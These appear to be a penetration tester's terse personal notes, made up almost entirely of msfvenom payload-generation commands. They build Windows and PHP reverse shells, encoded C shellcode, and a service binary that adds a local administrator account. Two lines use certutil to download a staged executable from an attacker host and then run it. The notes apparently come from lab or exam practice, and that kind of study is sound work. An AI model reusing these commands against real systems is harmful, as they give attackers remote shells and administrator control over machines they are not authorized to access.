
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -
f exe -o nonstaged.exe
```

```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -
f exe -o staged.exe
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=443 -
f msi -o reverse.msi
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443
EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

```
SendString("certutil.exe -urlcache -f http://kali/staged.exe \Users\Public\staged.exe",ip)
```

```
SendString("\Users\Public\staged.exe",ip)
```

```
msfvenom -p windows/exec CMD='net localgroup administrators akari /add' -f exe-service -o common.exe
```

### 2024-05-12-Sun

```
msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=tun0 lport=443 > pwned.php
```

